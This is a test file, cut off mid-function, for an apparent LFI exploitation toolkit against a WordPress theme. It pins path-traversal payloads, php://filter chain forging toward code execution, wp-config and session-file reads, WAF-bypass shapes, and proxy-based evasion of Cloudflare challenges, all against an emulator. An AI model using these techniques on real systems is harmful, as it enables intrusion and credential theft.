// lfichain.test.mjs -- hermetic pins for the LFI toolkit.
// Fake requesters with canned responses only -- NO live network, ever.
//
// The rce-oracle end-to-end runs against an in-process EMULATOR of the PHP
// include (test name carries the label): Docker was unavailable on this host
// (daemon pipe absent), so php:8-cli ground-truth validation of the emulated
// filter edge semantics is PENDING. The emulator implements exactly the
// documented semantics the primitives below are pinned against -- no more.

import test from 'node:test';
import assert from 'node:assert/strict';
import os from 'node:os';
import http from 'node:http';
import net from 'node:net';
import { createHash } from 'node:crypto';
import { mkdtempSync, readFileSync, rmSync } from 'node:fs';
import { join } from 'node:path';
import { Ghost, chainEgressId } from '../engine/ghost.mjs';
import { vaultKey, writeVault } from '../tools/clearance/broker.mjs';
import {
  phpB64Encode, phpB64Decode, b64QuantumInfo, swapPairs, widenUtf16, narrowUtf16,
  FILTER_STEPS, applyChain, planForgeChain, padPayload, markerFromPayload,
  extractB64Candidates, selectDecoded,
  madaraProfile, shapeFromWafBypass, loadShape, buildRequest,
  probeLfi, lfiRead, rceOracle, sessCheck, capabilityToFinding, cli,
  DEFAULT_PAYLOAD, DEFAULT_MARKER, CVE_ID,
} from '../tools/lfichain.mjs';

const sha256hex = (buf) => createHash('sha256').update(buf).digest('hex');

// ---------------------------------------------------------------------------
// The in-process vulnerable-include emulator (EMULATOR, NOT PHP): maps the
// template value to emulated filesystem content, applies php://filter chains
// with the SAME emulated semantics as the primitives, and "executes" content
// whose bytes begin with '<?' by extracting static echo outputs (the only
// payload effect lfichain can predict -- markerFromPayload enforces it).
// appendPhp models include($x . '.php'): the suffix is ALWAYS appended.
// ---------------------------------------------------------------------------
const normalize = (p) => String(p).replace(/^(\.\.\/)+/, '').replace(/^\/+/, '');

function includeEmulator(fs, { appendPhp = false, executed } = {}) {
  const lookup = (key) => {
    const k = normalize(key);
    if (appendPhp) return (k + '.php') in fs ? fs[k + '.php'] : null;
    return k in fs ? fs[k] : null;
  };
  return async ({ body }) => {
    let value = '';
    for (const part of String(body || '').split('&')) {
      if (part.startsWith('template=')) { value = part.slice('template='.length); break; }
    }
    if (!value) return { status: 200, headers: {}, body: '{"success":false}' };
    let content = null;
    if (/^php:\/\//i.test(value)) {
      const m = /^php:\/\/filter\/(.+)\/resource=(.+)$/i.exec(value);
      if (!m) return { status: 200, headers: {}, body: '' };
      const raw = lookup(m[2]);
      if (raw == null) return { status: 200, headers: {}, body: '' }; // include warning, no content
      const r = applyChain(Buffer.from(raw), m[1].split('|'));
      if (!r.ok) return { status: 200, headers: {}, body: '' };        // iconv failure kills the include
      content = r.buf;
    } else {
      const raw = lookup(value);
      if (raw == null) return { status: 200, headers: {}, body: '' };
      content = Buffer.from(raw);
    }
    const text = content.toString('latin1');
    if (text.startsWith('<?')) {
      const echoes = [...text.matchAll(/echo\s+'([^']*)'/g)].map((x) => x[1]);
      if (executed) executed.push(text.slice(0, 80));
      return { status: 200, headers: {}, body: '<div class="ajax">' + echoes.join('') + '</div>' };
    }
    return { status: 200, headers: {}, body: '<div class="ajax">' + text + '</div>' };
  };
}

const PASSWD = 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n';
const WPCONFIG = "<?php\ndefine('DB_NAME','wordpress');\ndefine('DB_USER','wp');\ndefine('DB_PASSWORD','s3cr3t-value');\n";
const URL_PRIV = 'http://127.0.0.1/wp-admin/admin-ajax.php';
const SCOPE_LOOP = '127.0.0.1/32';
const auditCollector = () => { const lines = []; const fn = (l) => lines.push(l); fn.lines = lines; return fn; };

// ---------------------------------------------------------------------------
// 1) Filter primitives -- vectors derived step by step.
// ---------------------------------------------------------------------------
test('phpB64Decode: PHP semantics (partial quanta, = stop, invalid skip)', () => {
  // 'QUI': values Q=16, U=20, I=8. Remainder-3 quantum ->
  //   byte0 = (16<<2)|(20>>4) = 64|1 = 65 'A'
  //   byte1 = ((20&15)<<4)|(8>>2) = 64|2 = 66 'B'
  assert.equal(phpB64Decode('QUI').toString('latin1'), 'AB');
  // 'QQ': remainder-2 quantum -> one byte: (16<<2)|(16>>4) = 64|1 = 65 'A'.
  assert.equal(phpB64Decode('QQ').toString('latin1'), 'A');
  // A single leftover char carries < 6 usable bits -> dropped.
  assert.equal(phpB64Decode('Q').length, 0);
  // '=' terminates decoding: b64('ABCD') = 'QUJDRA=='; trailing junk is never read.
  assert.equal(phpB64Decode('QUJDRA==JUNK').toString('latin1'), 'ABCD');
  // Non-alphabet chars are skipped, not fatal: 'Q U\nJ' -> 'QUJ' ->
  //   byte0 = (16<<2)|(20>>4) = 65 'A'; byte1 = ((20&15)<<4)|(9>>2) = 64|2 = 66 'B'.
  assert.equal(phpB64Decode('Q U\nJ').toString('latin1'), 'AB');
  // Round-trip identity on arbitrary bytes.
  const raw = Buffer.from([0, 1, 2, 250, 251, 252, 65, 66, 67, 255]);
  assert.ok(phpB64Decode(phpB64Encode(raw)).equals(raw));
});

test('swapPairs: byte-pair swap; odd length is a step error (PHP iconv rejects truncated units)', () => {
  const r = swapPairs(Buffer.from([0x41, 0x42, 0x43, 0x44]));
  assert.ok(r.ok);
  assert.deepEqual([...r.buf], [0x42, 0x41, 0x44, 0x43]); // 'ABCD' -> 'BADC'
  assert.equal(swapPairs(Buffer.from([1, 2, 3])).ok, false);
});

test('widen/narrow: UTF-8 <-> UTF-16LE, exact and fatal on invalid input', () => {
  // ASCII widen = NUL injection: 'AB' -> 41 00 42 00.
  assert.deepEqual([...widenUtf16(Buffer.from('AB')).buf], [0x41, 0x00, 0x42, 0x00]);
  // UTF-8 C3 A9 = 110_00011 10_101001 -> codepoint 000_11101001 = U+00E9 -> LE bytes E9 00.
  assert.deepEqual([...widenUtf16(Buffer.from([0xC3, 0xA9])).buf], [0xE9, 0x00]);
  // ...and narrow inverts it: E9 00 -> U+00E9 -> UTF-8 C3 A9.
  assert.deepEqual([...narrowUtf16(Buffer.from([0xE9, 0x00])).buf], [0xC3, 0xA9]);
  assert.equal(widenUtf16(Buffer.from([0xFF])).ok, false);   // ill-formed UTF-8
  assert.equal(narrowUtf16(Buffer.from([0x41])).ok, false);  // truncated unit
});

test('pair-swap lemma: on canonical unpadded 4-aligned base64, E(D(W(S))) === W(S)', () => {
  // Hand derivation for one quantum of S = 'QUJD' (values Q=16,U=20,J=9,D=3):
  //   W -> 'UQDC' (values 20,16,3,2)
  //   D -> byte0 = (20<<2)|(16>>4) = 80|1 = 81
  //        byte1 = ((16&15)<<4)|(3>>2) = 0|0 = 0
  //        byte2 = ((3&3)<<6)|2 = 192|2 = 194
  //   E(81,0,194): c0 = 81>>2 = 20 'U'; c1 = ((81&3)<<4)|(0>>4) = 16 'Q';
  //                c2 = ((0&15)<<2)|(194>>6) = 3 'D'; c3 = 194&63 = 2 'C' -> 'UQDC' = W(S).
  // So the restricted E/D/W moves REORDER 6-bit values but never create them --
  // the conservation fact behind the documented reach limit of the planner.
  // (Samples must be canonical full-quantum encodings: padding/remainder chars
  // carry discarded low bits, so they are outside the lemma.)
  const E = FILTER_STEPS['convert.base64-encode'];
  const D = FILTER_STEPS['convert.base64-decode'];
  const W = FILTER_STEPS['convert.iconv.UTF-16LE.UTF-16BE'];
  for (const s of ['QUJD', 'UEhQ', 'QUJDREVG']) {
    const w = W(Buffer.from(s, 'latin1')).buf;
    const roundTrip = E(D(w).buf).buf.toString('latin1');
    assert.equal(roundTrip, w.toString('latin1'), 'lemma holds for ' + s);
  }
});

test('b64QuantumInfo: alignment introspection for chain construction', () => {
  // 'QUJDRA==': 6 valid chars before '=', 1 complete quantum + remainder 2 -> 3+1 = 4 bytes.
  assert.deepEqual(b64QuantumInfo('QUJDRA=='), { valid: 6, quanta: 1, remainder: 2, dropped: 0, decodedBytes: 4 });
  // remainder 1 is the trim boundary: the leftover char is dropped by the decode.
  assert.deepEqual(b64QuantumInfo('QUJDR'), { valid: 5, quanta: 1, remainder: 1, dropped: 1, decodedBytes: 3 });
});

// ---------------------------------------------------------------------------
// 2) Payload handling + the deterministic chain planner.
// ---------------------------------------------------------------------------
test('padPayload: pads to a base64-quantum boundary after the closing tag; refuses unpredictable padding', () => {
  const pad = padPayload(DEFAULT_PAYLOAD); // 35 bytes -> 36 (one inert newline after '?>)
  assert.ok(pad.ok);
  assert.equal(pad.buf.length, 36);
  assert.equal(pad.padded, 1);
  assert.equal(pad.buf[35], 0x0a);
  assert.ok(pad.buf.subarray(0, 35).equals(Buffer.from(DEFAULT_PAYLOAD)));
  const exact = padPayload("<?php echo 'ABCDE'; ?>"); // 22 bytes -> 22 % 3 = 1 -> needs 2
  assert.equal(exact.buf.length, 24);
  const noTag = padPayload("<?php echo 'A'"); // 14 bytes, no '?>', needs 1 -> refused
  assert.equal(noTag.ok, false);
  assert.match(noTag.reason, /closing/);
});

test('markerFromPayload: the oracle marker is statically derived or the payload is refused', () => {
  assert.equal(markerFromPayload(DEFAULT_PAYLOAD), DEFAULT_MARKER);
  assert.equal(markerFromPayload("<?php system('id'); ?>"), null); // no static echo -> no oracle
  assert.equal(markerFromPayload("<?php echo 'has' . 'concat'; ?>"), null);
});

test('planForgeChain: finds chains the emulator verifies, refuses honestly when unreachable', () => {
  const target = padPayload(DEFAULT_PAYLOAD).buf; // 36 bytes
  const b64 = Buffer.from(phpB64Encode(target), 'latin1'); // 48 chars

  // F1: the resource already holds b64(payload) -> a single decode solves it.
  const f1 = planForgeChain({ resource: b64, payload: DEFAULT_PAYLOAD });
  assert.ok(f1.ok);
  assert.deepEqual(f1.steps, ['convert.base64-decode']);

  // F2: pair-swapped b64(payload) -> swap then decode.
  const f2res = swapPairs(b64).buf;
  const f2 = planForgeChain({ resource: f2res, payload: DEFAULT_PAYLOAD });
  assert.ok(f2.ok);
  assert.ok(applyChain(f2res, f2.steps).buf.subarray(0, 36).equals(target), 'emulated chain yields the payload prefix');

  // F3: a three-move fixture: R = D(W(b64(payload))) needs E,W,D (or an equivalent) to forge.
  const f3res = phpB64Decode(swapPairs(b64).buf.toString('latin1'));
  const f3 = planForgeChain({ resource: f3res, payload: DEFAULT_PAYLOAD });
  assert.ok(f3.ok);
  assert.ok(applyChain(f3res, f3.steps).buf.subarray(0, 36).equals(target));

  // Degenerate: the resource already begins with the payload -> zero filters.
  const f0 = planForgeChain({ resource: Buffer.concat([target, Buffer.from('junk')]), payload: DEFAULT_PAYLOAD });
  assert.ok(f0.ok);
  assert.deepEqual(f0.steps, []);

  // Refusal: an unrelated resource within tight bounds -> honest exhaustion, no claim.
  const f4 = planForgeChain({ resource: Buffer.from('the quick brown fox jumps over the lazy dog'), payload: DEFAULT_PAYLOAD, maxSteps: 4, maxStates: 400 });
  assert.equal(f4.ok, false);
  assert.match(f4.reason, /exhausted|unreachable|no chain/);
});

test('applyChain: unknown filter step fails the chain with the step index', () => {
  const r = applyChain(Buffer.from('abc'), ['convert.base64-encode', 'convert.iconv.FOO.BAR']);
  assert.equal(r.ok, false);
  assert.equal(r.atStep, 1);
});

// ---------------------------------------------------------------------------
// 3) Base64 exfil parsing against fixture HTML.
// ---------------------------------------------------------------------------
test('extractB64Candidates + selectDecoded: locates the exfil blob, marker beats decoys', () => {
  const blob = phpB64Encode(Buffer.from(PASSWD)); // 184 chars
  // A LONGER binary decoy (all high bytes -> printable ratio 0) must lose to the real blob.
  const decoyBytes = Buffer.from(Array.from({ length: 160 }, (_, i) => 128 + ((i * 37) % 128)));
  const decoy = phpB64Encode(decoyBytes); // 216 chars
  const body = '<div id="x" data-t="' + decoy + '">{"html":"before <p>' + blob + '</p> after","success":true}</div>';
  const cands = extractB64Candidates(body);
  assert.equal(cands.length, 2, 'both runs located');
  assert.equal(cands[0].encoded, decoy, 'sorted longest-first');
  const pick = selectDecoded(cands, { markerRe: /root:x:0:0:/ });
  assert.ok(pick);
  assert.match(pick.bytes.toString('latin1'), /root:x:0:0:/);
  assert.equal(body.indexOf(pick.encoded), pick.offset, 'offset is honest');
  // Without a marker the longest PRINTABLE candidate wins: the binary decoy is ratio-filtered.
  const plain = selectDecoded(cands, {});
  assert.equal(plain.encoded, blob);
});

// ---------------------------------------------------------------------------
// 4) Shape loading + request construction.
// ---------------------------------------------------------------------------
test('shapeFromWafBypass: re-targets the passing payload, replays the param game', () => {
  const report = { passingShapes: [{ mutation: { id: 'lfi-dotdotslash', family: 'traversal-style', payload: '....//....//etc/passwd', paramMode: 'dup-last', bodyKind: 'form' }, stability: '3/3 re-verified' }] };
  const r = shapeFromWafBypass(report);
  assert.ok(r.ok);
  assert.equal(r.shape.valueTemplate, '....//....//{{PATH}}');
  assert.equal(r.shape.paramMode, 'dup-last');
  assert.equal(r.shape.fromWafbypass.id, 'lfi-dotdotslash');
  // Encoded style: the base target suffix matches case-insensitively in encoded form.
  const enc = shapeFromWafBypass({ mutation: { payload: '..%2e%2f..%2e%2fetc%2Fpasswd', paramMode: 'single' } });
  assert.ok(enc.ok);
  assert.equal(enc.shape.valueTemplate, '..%2e%2f..%2e%2f{{PATH}}');
  // Nothing passing / wrong base target -> fail-closed.
  assert.equal(shapeFromWafBypass({ passingShapes: [] }).ok, false);
  assert.equal(shapeFromWafBypass({ mutation: { payload: '../../etc/hosts' } }).ok, false);
});

test('loadShape: inline shape, wafbypass report, and placeholder enforcement', () => {
  const def = loadShape({});
  assert.ok(def.ok);
  assert.equal(def.profile.bodyTemplate, 'action=madara_load_more&template={{LFI}}');
  const inline = loadShape({ shape: JSON.stringify({ bodyTemplate: 'action=custom&p={{LFI}}', traversalPrefix: '../../' }) });
  assert.ok(inline.ok);
  assert.equal(inline.profile.bodyTemplate, 'action=custom&p={{LFI}}');
  assert.equal(inline.profile.traversalPrefix, '../../');
  const bad = loadShape({ shape: JSON.stringify({ bodyTemplate: 'action=custom&p=nope' }) });
  assert.equal(bad.ok, false);
  assert.match(bad.reason, /\{\{LFI\}\}/);
  const wf = loadShape({ shape: JSON.stringify({ passingShapes: [{ mutation: { payload: '../etc/passwd', paramMode: 'array' } }] }) });
  assert.ok(wf.ok);
  assert.equal(wf.profile.paramMode, 'array');
  assert.equal(wf.profile.valueTemplate, '../{{PATH}}');
  assert.ok(wf.profile.fromWafbypass, 'report conversion is recorded on the profile');
});

test('buildRequest: madara default body, param games, GET and multipart placements', () => {
  const u = new URL('http://127.0.0.1/wp-admin/admin-ajax.php');
  const p = madaraProfile({});
  const r0 = buildRequest(p, u, 'VALUE');
  assert.equal(r0.method, 'POST');
  assert.equal(r0.body, 'action=madara_load_more&template=VALUE');
  assert.equal(r0.headers['content-type'], 'application/x-www-form-urlencoded');
  const df = buildRequest({ ...p, paramMode: 'dup-first' }, u, 'VALUE');
  assert.equal(df.body, 'action=madara_load_more&template=VALUE&template=index');
  const dl = buildRequest({ ...p, paramMode: 'dup-last' }, u, 'VALUE');
  assert.equal(dl.body, 'action=madara_load_more&template=index&template=VALUE');
  const g = buildRequest({ ...p, method: 'GET' }, u, 'VALUE');
  assert.equal(g.body, null);
  assert.match(g.url, /\?template=VALUE$/);
  const mp = buildRequest({ ...p, bodyKind: 'multipart' }, u, 'VALUE');
  assert.match(mp.headers['content-type'], /^multipart\/form-data; boundary=/);
  assert.match(mp.body, /name="template"\r\n\r\nVALUE/);
});

// ---------------------------------------------------------------------------
// 5) probe: the capability matrix (three scenarios through the emulator).
// ---------------------------------------------------------------------------
const FS_OPEN = { 'etc/passwd': PASSWD, 'wp-config.php': WPCONFIG };

test('probe (emulator): full-open target -> traversal + wrappers, suffix none-observed', async () => {
  const audit = auditCollector();
  const r = await probeLfi(URL_PRIV, { scope: SCOPE_LOOP, requester: includeEmulator(FS_OPEN), paceMs: 0, audit });
  assert.equal(r.ok, true);
  assert.equal(r.capability.cve, CVE_ID);
  assert.equal(r.capability.traversal, true);
  assert.equal(r.capability.wrappers, true);
  assert.match(r.capability.suffixConstraint, /^none-observed/);
  assert.equal(r.requests, 5); // 2 direct markers + 1 wrapper + 2 suffix discriminators
  const direct = r.probes.find((p) => p.name === 'direct:unix-passwd');
  assert.equal(direct.hit, true);
  assert.match(direct.evidence, /root:x:0:0/);
  const wrap = r.probes.find((p) => p.name === 'wrapper:unix-passwd');
  assert.equal(wrap.hit, true);
  assert.match(r.note, /marker-verified/);
  // capabilityToFinding: the cvepack seam upgrades only on real traversal.
  const finding = capabilityToFinding(r.capability, r.url);
  assert.equal(finding.confidence, 'confirmed');
  assert.equal(finding.cve, CVE_ID);
  assert.equal(capabilityToFinding({ traversal: false }, r.url), null);
  // one audit line, matching mode
  assert.equal(audit.lines.length, 1);
  assert.equal(audit.lines[0].tool, 'lfichain');
  assert.equal(audit.lines[0].mode, 'probe');
  assert.equal(audit.lines[0].ok, true);
});

test('probe (emulator): suffix-appending include -> appends-.php inference with evidence', async () => {
  const r = await probeLfi(URL_PRIV, { scope: SCOPE_LOOP, requester: includeEmulator({ 'wp-config.php': WPCONFIG }, { appendPhp: true }), paceMs: 0, audit: false });
  assert.equal(r.ok, true);
  assert.equal(r.capability.traversal, false);
  assert.equal(r.capability.wrappers, true, 'wp-config resolves via the appended suffix');
  assert.match(r.capability.suffixConstraint, /^appends-\.php/);
  const b = r.probes.find((p) => p.name === 'wrapper:wp-config');
  const c = r.probes.find((p) => p.name === 'wrapper:wp-config.php');
  assert.equal(b.hit, true);
  assert.equal(c.hit, false);
});

test('probe (emulator): dead target -> honest zeros, unknown suffix, unobserved-not-absent gaps', async () => {
  const r = await probeLfi(URL_PRIV, { scope: SCOPE_LOOP, requester: includeEmulator({}), paceMs: 0, audit: false });
  assert.equal(r.ok, true);
  assert.equal(r.capability.traversal, false);
  assert.equal(r.capability.wrappers, false);
  assert.match(r.capability.suffixConstraint, /^unknown/);
  assert.ok(r.gaps.some((g) => /unobserved, not absent/.test(g)));
  assert.equal(capabilityToFinding(r.capability, r.url), null);
});

test('probe: pacing honors paceMs between request starts', async () => {
  const at = [];
  const emu = includeEmulator(FS_OPEN);
  const req = async (q) => { at.push(Date.now()); return emu(q); };
  await probeLfi(URL_PRIV, { scope: SCOPE_LOOP, requester: req, paceMs: 40, audit: false });
  assert.ok(at.length >= 5);
  for (let i = 1; i < at.length; i++) {
    assert.ok(at[i] - at[i - 1] >= 25, 'gap ' + i + ' paced (25ms slop bound)');
  }
});

// ---------------------------------------------------------------------------
// 6) Governance: scope + ghost + off-origin refusals (fail-closed, no wire).
// ---------------------------------------------------------------------------
test('scope: missing scope refuses before any request; the refusal says why', async () => {
  let wire = 0;
  const r = await probeLfi('http://target.example/wp-admin/admin-ajax.php', { requester: async () => { wire++; return { status: 200, body: '' }; }, audit: false });
  assert.equal(r.ok, false);
  assert.match(r.reason, /no signed engagement scope/);
  assert.equal(wire, 0);
});

test('scope: out-of-scope resolution, unresolvable host, and in-scope pass', async () => {
  const out = await probeLfi('http://target.example/x', { scope: '10.10.0.0/16', resolve: async () => ['93.184.216.34'], audit: false });
  assert.equal(out.ok, false);
  assert.match(out.reason, /resolves outside the signed engagement scope/);
  assert.match(out.reason, /10\.10\.0\.0\/16/); // the refusal prints the signed scope

  const dead = await probeLfi('http://target.example/x', { scope: '10.10.0.0/16', resolve: async () => { throw new Error('ENOTFOUND'); }, audit: false });
  assert.equal(dead.ok, false);
  assert.match(dead.reason, /could not resolve/);

  const ok = await probeLfi('http://10.10.1.5/x', { scope: '10.10.0.0/16', requester: includeEmulator(FS_OPEN), paceMs: 0, audit: false });
  assert.equal(ok.ok, true);
  assert.deepEqual(ok.scope.resolved, ['10.10.1.5']);
});

test('ghost: a public target with no chain is refused fail-closed (never falls back to direct)', async () => {
  let wire = 0;
  const r = await probeLfi('http://93.184.216.34/x', {
    scope: '93.184.216.0/24', ghost: new Ghost(), audit: false,
    requester: async () => { wire++; return { status: 200, body: '' }; },
  });
  assert.equal(r.ok, false);
  assert.match(r.reason, /ghost chain unavailable/);
  assert.equal(wire, 0);
});

test('off-origin shape endpoint is refused (cfmap same-origin guard)', async () => {
  const r = await probeLfi('http://10.10.1.5/x', { scope: '10.10.0.0/16', endpointUrl: 'http://10.10.9.9/x', audit: false });
  assert.equal(r.ok, false);
  assert.match(r.reason, /off-origin/);
});

// ---------------------------------------------------------------------------
// 7) read: exfiltration with OPSEC discipline (no contents in the report).
// ---------------------------------------------------------------------------
test('read (emulator): evidence written, report carries {path, sha256, size} only', async () => {
  const writes = [];
  const writeEvidence = async (path, buf) => { writes.push({ path, buf }); return { evidenceFile: 'mem://' + path, sha256: sha256hex(buf) }; };
  const audit = auditCollector();
  const r = await lfiRead(URL_PRIV, {
    scope: SCOPE_LOOP, requester: includeEmulator(FS_OPEN), paceMs: 0, audit,
    paths: ['wp-config.php', 'nope.php'], writeEvidence,
  });
  assert.equal(r.ok, true);
  assert.equal(r.results.length, 2);
  const hit = r.results[0];
  assert.equal(hit.ok, true);
  assert.equal(hit.sha256, sha256hex(Buffer.from(WPCONFIG)));
  assert.equal(hit.size, Buffer.from(WPCONFIG).length);
  assert.equal(hit.markerHint, true);
  assert.equal(writes[0].buf.toString(), WPCONFIG);
  // THE OPSEC PIN: the secret must not appear anywhere in the returned object or the audit line.
  assert.ok(!JSON.stringify(r).includes('s3cr3t-value'), 'no file contents in the report');
  assert.ok(!JSON.stringify(audit.lines).includes('s3cr3t-value'), 'no file contents in the audit line');
  assert.equal(r.results[1].ok, false);
  assert.match(r.results[1].reason, /unobserved, not absent/);
  assert.equal(audit.lines.length, 1);
  assert.equal(audit.lines[0].mode, 'read');
});

test('read (emulator): default evidence writer lands a real file in the evidence dir', async () => {
  const dir = mkdtempSync(join(os.tmpdir(), 'lfichain-ev-'));
  try {
    const r = await lfiRead(URL_PRIV, { scope: SCOPE_LOOP, requester: includeEmulator(FS_OPEN), paceMs: 0, audit: false, paths: ['wp-config.php'], evidenceDir: dir });
    assert.equal(r.ok, true);
    const file = r.results[0].evidenceFile;
    assert.ok(file.startsWith(dir));
    assert.ok(/^[0-9a-f]{16}-wp-config\.php$/.test(file.slice(dir.length + 1)), 'sha256-prefixed sanitized name');
    assert.equal(readFileSync(file, 'latin1'), WPCONFIG);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------
// 8) sesscheck: feasibility only, masked id, fail-closed validation.
// ---------------------------------------------------------------------------
test('sesscheck (emulator): session serialization markers -> feasible, detection only', async () => {
  const fs = { 'var/lib/php/sessions/sess_abc123def456': 'uid|i:1000;name|s:4:"jack";admin|b:1;' };
  const r = await sessCheck(URL_PRIV, { scope: SCOPE_LOOP, requester: includeEmulator(fs), paceMs: 0, audit: false, sessionId: 'abc123def456' });
  assert.equal(r.ok, true);
  assert.equal(r.feasible, true);
  const hit = r.results.find((x) => x.included);
  assert.equal(hit.path, '/var/lib/php/sessions/sess_abc123def456');
  assert.match(hit.evidence, /session serialization/);
  assert.ok(!JSON.stringify(r).includes('s:4:"jack"'), 'session content never in the report');
  assert.equal(r.sessionId, 'abc1...f456', 'the live id is masked in the report');
  assert.match(r.note, /detection\/feasibility only/);
  const no = await sessCheck(URL_PRIV, { scope: SCOPE_LOOP, requester: includeEmulator({}), paceMs: 0, audit: false, sessionId: 'abc123def456' });
  assert.equal(no.feasible, false);
  assert.ok(no.gaps.some((g) => /unobserved, not absent/.test(g)));
});

test('sesscheck: a malformed session id never reaches the wire', async () => {
  let wire = 0;
  const r = await sessCheck(URL_PRIV, { scope: SCOPE_LOOP, requester: async () => { wire++; return { status: 200, body: '' }; }, audit: false, sessionId: 'x/../../etc' });
  assert.equal(r.ok, false);
  assert.match(r.reason, /malformed PHPSESSID/);
  assert.equal(wire, 0);
});

// ---------------------------------------------------------------------------
// 9) rce-oracle: HITL gate, payload validation, planner refusal, and the
//    end-to-end EMULATOR confirmation (labeled: emulator, not PHP).
// ---------------------------------------------------------------------------
test('rce-oracle: refuses without --operator-confirm, audits the refusal, zero requests', async () => {
  let wire = 0;
  const audit = auditCollector();
  const r = await rceOracle(URL_PRIV, { scope: SCOPE_LOOP, requester: async () => { wire++; return { status: 200, body: '' }; }, audit });
  assert.equal(r.ok, false);
  assert.equal(r.decision, 'refused');
  assert.match(r.reason, /--operator-confirm/);
  assert.match(r.reason, /HITL/);
  assert.equal(wire, 0);
  assert.equal(audit.lines.length, 1);
  assert.equal(audit.lines[0].mode, 'rce-oracle');
  assert.equal(audit.lines[0].decision, 'refused');
  assert.equal(audit.lines[0].operatorConfirm, false);
});

test('rce-oracle: refuses a payload with no statically predictable marker', async () => {
  const r = await rceOracle(URL_PRIV, { scope: SCOPE_LOOP, requester: includeEmulator(FS_OPEN), paceMs: 0, audit: false, operatorConfirm: true, payload: "<?php system('id'); ?>" });
  assert.equal(r.ok, false);
  assert.match(r.reason, /predictable marker/);
});

test('rce-oracle: planner exhaustion is an honest not-confirmed, never a claim', async () => {
  const fs = { 'note.txt': 'plain prose that will never forge a payload prefix' };
  const r = await rceOracle(URL_PRIV, {
    scope: SCOPE_LOOP, requester: includeEmulator(fs), paceMs: 0, audit: false,
    operatorConfirm: true, resource: '/note.txt', maxSteps: 4, maxStates: 300,
  });
  assert.equal(r.ok, false);
  assert.equal(r.decision, 'not-confirmed');
  assert.match(r.reason, /chain planner/);
  assert.equal(r.requests, 1, 'only the resource read hit the wire');
});

test('rce-oracle end-to-end (EMULATOR, NOT PHP -- live PHP validation pending): read -> plan -> one oracle request -> marker-confirmed', async () => {
  const target = padPayload(DEFAULT_PAYLOAD).buf;
  const fs = { 'var/www/html/data.bin': swapPairs(Buffer.from(phpB64Encode(target), 'latin1')).buf };
  const executed = [];
  const audit = auditCollector();
  const r = await rceOracle(URL_PRIV, {
    scope: SCOPE_LOOP, requester: includeEmulator(fs, { executed }), paceMs: 0, audit,
    operatorConfirm: true, resource: '/var/www/html/data.bin',
  });
  assert.equal(r.ok, true);
  assert.equal(r.confirmed, true);
  assert.equal(r.marker, DEFAULT_MARKER);
  assert.equal(r.requests, 2, 'one wrapper read + one oracle confirmation');
  assert.ok(Array.isArray(r.steps) && r.steps.length >= 1);
  // The built chain really transforms the resource into the payload (emulated).
  assert.ok(applyChain(fs['var/www/html/data.bin'], r.steps).buf.subarray(0, 36).equals(target));
  // The emulator executed exactly the payload bytes.
  assert.equal(executed.length, 1);
  assert.ok(executed[0].startsWith("<?php echo '" + DEFAULT_MARKER + "'; ?>"));
  assert.equal(r.emulation.includes('node-emulator'), true);
  assert.match(r.note, /PENDING/);
  assert.equal(audit.lines[0].decision, 'confirmed');
  assert.equal(audit.lines[0].operatorConfirm, true);
});

// ---------------------------------------------------------------------------
// 10) cli() surface.
// ---------------------------------------------------------------------------
test('cli: probe through flags; rce-oracle without the flag refuses; unknown subcommand shows usage', async () => {
  const audit = auditCollector();
  const r = await cli(['probe', '--url', URL_PRIV, '--scope', SCOPE_LOOP, '--pace', '0'], { requester: includeEmulator(FS_OPEN), audit });
  assert.equal(r.ok, true);
  assert.equal(r.capability.traversal, true);

  const no = await cli(['rce-oracle', '--url', URL_PRIV, '--scope', SCOPE_LOOP], { requester: includeEmulator(FS_OPEN), audit: false });
  assert.equal(no.ok, false);
  assert.match(no.reason, /--operator-confirm/);

  const bad = await cli(['bogus', '--url', URL_PRIV], { audit: false });
  assert.equal(bad.ok, false);
  assert.match(bad.reason, /subcommand/);
  assert.ok(bad.usage);

  // A wafbypass report consumed via --shape: converted to a style shape, probe runs.
  const shapeR = await cli(['probe', '--url', URL_PRIV, '--scope', SCOPE_LOOP, '--pace', '0', '--shape', JSON.stringify({ passingShapes: [{ mutation: { payload: '../../../../etc/passwd', paramMode: 'single' } }] })], { requester: includeEmulator(FS_OPEN), audit: false });
  assert.equal(shapeR.ok, true);
  assert.ok(shapeR.profile.fromWafbypass, 'inline wafbypass report converted into a style shape');
  assert.equal(shapeR.capability.traversal, true);
});

// ---------------------------------------------------------------------------
// 11) The vault ride (2026-08-10: a cookieless probe against a Cloudflare-
// challenged zone is burned at the edge even with a valid clearance in the
// vault). Wire-level proof over the cfride.test.mjs harness: a LOCAL mock
// SOCKS5 proxy + a LOCAL http origin wrapping the include emulator; the public
// target NAME never resolves locally, so a served run PROVES the requests rode
// the chain (DNS-by-last-proxy). Nothing leaves loopback, ever. The ride lives
// in prepare(), so every mode is covered -- probe/read exercise it below, and
// rce-oracle's single confirmation request is pinned explicitly.
// ---------------------------------------------------------------------------

const RIDE_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const PUBLIC_HOST = 'zone-one.example'; // unresolvable locally: direct egress would fail DNS
const PERSONA_RE = /Chrome\/126/; // the ghost persona UA (engine/ghost scrubHeaders default)

function listen(server) {
  return new Promise((r) => server.listen(0, '127.0.0.1', () => r(server.address().port)));
}
// server.close() waits for keep-alive agent sockets forever -- force them down first.
function closeServer(server) {
  return new Promise((r) => {
    const t = setTimeout(r, 2000);
    try { server.closeAllConnections && server.closeAllConnections(); } catch {}
    server.close(() => { clearTimeout(t); r(); });
  });
}

// SOCKS5 mock (the ghost.test.mjs pattern): completes the handshake, records the
// CONNECT target, then tunnels by CONNECT PORT to 127.0.0.1 -- the public NAME
// travels to the proxy (remote-DNS doctrine) and the loopback origin answers.
function mockSocks5(state) {
  return net.createServer((sock) => {
    let stage = 0, buf = Buffer.alloc(0);
    sock.on('data', (d) => {
      buf = Buffer.concat([buf, d]);
      if (stage === 0 && buf.length >= 2 + buf[1]) {
        sock.write(Buffer.from([0x05, 0x00])); stage = 1; buf = Buffer.alloc(0);
      } else if (stage === 1 && buf.length >= 5) {
        const hlen = buf[4];
        const host = buf.subarray(5, 5 + hlen).toString();
        const port = buf.readUInt16BE(5 + hlen);
        state.connects.push({ host, port });
